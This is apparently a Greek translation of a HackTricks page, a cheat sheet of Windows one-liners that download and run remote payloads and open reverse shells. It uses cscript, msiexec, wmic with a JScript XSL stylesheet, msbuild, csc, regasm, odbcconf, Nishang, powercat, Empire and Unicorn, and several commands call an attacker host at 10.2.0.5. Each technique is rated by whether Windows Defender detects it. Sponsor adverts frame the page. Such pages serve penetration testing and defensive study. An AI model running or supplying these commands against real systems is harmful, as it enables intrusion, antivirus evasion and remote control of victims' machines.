Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίβα, από τα APIs έως τις web εφαρμογές και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Το Cscript είναι ένα εργαλείο που παρέχεται από τη Microsoft και χρησιμοποιείται για την εκτέλεση VBScript αρχείων. Μπορεί να χρησιμοποιηθεί και στο πλαίσιο της εκτέλεσης επιθέσεων χρησιμοποιώντας το Metasploit Framework.

Για να εκτελέσετε ένα VBScript αρχείο μέσω του Cscript στο Metasploit, μπορείτε να χρησιμοποιήσετε την εντολή `execute -f cscript -a <path_to_vbscript_file>`.

Αυτή η εντολή θα εκτελέσει το VBScript αρχείο με τη χρήση του Cscript στον στόχο σας. Μπορείτε να χρησιμοποιήσετε αυτήν τη μέθοδο για να εκτελέσετε κακόβουλο κώδικα ή να εκτελέσετε εντολές στο σύστημα του στόχου.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Ανιχνεύθηκε από τον defender**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Διεργασία που εκτελεί δίκτυα κλήση: **svchost.exe**\
Φορτίο που εγγράφεται στον δίσκο: **Τοπική μνήμη πελάτη WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Ανιχνεύθηκε από τον defender**

## **MSIExec**

Επιτιθέμενος
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Θύμα:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Εντοπίστηκε**

## **Wmic**

* [Από εδώ](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Παράδειγμα αρχείου xsl [από εδώ](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Μη ανιχνεύσιμο**

**Μπορείτε να κατεβάσετε και να εκτελέσετε πολύ εύκολα ένα Koadic zombie χρησιμοποιώντας το stager wmic**

## Msbuild

* [Από εδώ](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Μπορείτε να χρησιμοποιήσετε αυτήν την τεχνική για να παρακάμψετε τον έλεγχο λευκής λίστας εφαρμογών και τους περιορισμούς του Powershell.exe. Θα σας ζητηθεί να εκτελέσετε ένα PS shell.\
Απλά κατεβάστε αυτό και εκτελέστε το: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Μη ανιχνεύσιμο**

## **CSC**

Μεταγλώττιση κώδικα C# στη μηχανή του θύματος.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Μπορείτε να κατεβάσετε έναν βασικό αντίστροφο κέλυφος C# από εδώ: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Δεν ανιχνεύεται**

## **Regasm/Regsvc**

* [Από εδώ](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Δεν το έχω δοκιμάσει**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [Από εδώ](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Δεν το έχω δοκιμάσει**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Κέλυφη Powershell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Στον φάκελο **Shells**, υπάρχουν πολλά διαφορετικά κέλυφα. Για να κατεβάσετε και να εκτελέσετε το αρχείο Invoke-_PowerShellTcp.ps1_, αντιγράψτε το σε ένα αντίγραφο του σεναρίου και προσθέστε στο τέλος του αρχείου:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Ξεκινήστε την εξυπηρέτηση του σεναρίου σε έναν διακομιστή ιστού και εκτελέστε το στο τέλος του θύματος:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Ο Defender δεν το ανιχνεύει ως κακόβουλο κώδικα (ακόμα, 3/04/2019).

**TODO: Ελέγξτε άλλα nishang shells**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Κατεβάστε, ξεκινήστε έναν web server, ξεκινήστε τον ακροατή και εκτελέστε το στο τέλος του θύματος:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Ο Defender δεν το ανιχνεύει ως κακόβουλο κώδικα (ακόμα, 3/04/2019).

**Άλλες επιλογές που προσφέρονται από το powercat:**

Συνδέσεις bind, Αντίστροφη σύνδεση (TCP, UDP, DNS), Ανακατεύθυνση θύρας, Μεταφόρτωση/Λήψη, Δημιουργία φορτίων, Παροχή αρχείων...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Δημιουργήστε έναν εκκινητή powershell, αποθηκεύστε τον σε ένα αρχείο και κατεβάστε και εκτελέστε τον.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Ανιχνεύθηκε ως κακόβουλος κώδικας**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Δημιουργήστε μια έκδοση του metasploit backdoor σε powershell χρησιμοποιώντας το unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Ξεκινήστε το msfconsole με το δημιουργημένο αρχείο πόρου:
```
msfconsole -r unicorn.rc
```
Ξεκινήστε έναν διακομιστή ιστού που θα εξυπηρετεί το αρχείο _powershell\_attack.txt_ και εκτελέστε το εξής στο θύμα:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Εντοπίστηκε κακόβουλος κώδικας**

## Περισσότερα

[PS>Attack](https://github.com/jaredhaight/PSAttack) Κονσόλα PS με ορισμένα προ-φορτωμένα επιθετικά PS modules (κρυπτογραφημένα)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Κονσόλα PS με ορισμένα προ-φορτωμένα επιθετικά PS modules και ανίχνευση διακομιστή μεσολάβησης (IEX)

## Αναφορές

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που έχουν μεγαλύτερη σημασία, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από τις διεπαφές προγραμματισμού εφαρμογών (APIs) μέχρι τις ιστοσελίδες και τα συστήματα στο cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
